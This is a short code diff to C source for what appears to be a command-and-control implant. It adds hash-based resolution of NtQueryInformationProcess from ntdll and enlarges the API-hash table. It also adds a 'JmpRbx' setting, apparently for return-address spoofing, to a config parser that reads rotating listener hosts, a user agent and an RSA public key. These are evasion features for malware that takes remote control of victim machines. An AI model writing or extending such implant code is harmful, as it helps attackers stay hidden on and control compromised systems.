@@ -29,7 +29,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 #endif
 
 UINT64 DllHashes[2] = { 0 };
-UINT64 ApiHashes[54] = { 0 };
+UINT64 ApiHashes[56] = { 0 };
 
 INT init_agent(PVOID RetAddress) {
 
@@ -203,6 +203,14 @@ INT init_agent(PVOID RetAddress) {
     if (!agent->apis->pNtCreateThreadEx)
         return -1;
 
+    //not used.
+  //  agent->apis->pNtSetInformationVirtualMemory = (t_NtSetInformationVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[54]);
+   // if (!agent->apis->pNtSetInformationVirtualMemory)
+    //    return -1;
+
+    agent->apis->pNtQueryInformationProcess = (t_NtQueryInformationProcess)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[55]);
+    if (!agent->apis->pNtQueryInformationProcess)
+        return -1;
 
     //obtain iphlpapi apis
     agent->apis->pGetAdaptersInfo = (t_GetAdaptersInfo)RetrieveFunctionPointerFromhash(agent->apis->hIphlpapi, ApiHashes[19]);
@@ -428,6 +436,8 @@ INT ParseConfig() {
 	agent->config->listenerConfig->CurrentHost = SelectHost(agent->config->listenerConfig->HostRotation);
 
 	agent->config->listenerConfig->Secure = ParserReadInt32(&parser);
+    agent->config->JmpRbx = ParserReadBool(&parser);
+
     BufferW = ParserReadWString(&parser, &Length);
     agent->config->listenerConfig->UserAgent = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
 	MemoryCopy(agent->config->listenerConfig->UserAgent, BufferW, Length);
@@ -448,6 +458,7 @@ INT ParseConfig() {
 	agent->config->RSAPubKey = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length);
 	MemoryCopy(agent->config->RSAPubKey, BufferW, Length);
 	agent->config->RSAPubKeySize = Length;
+
 
     return 0;
 }
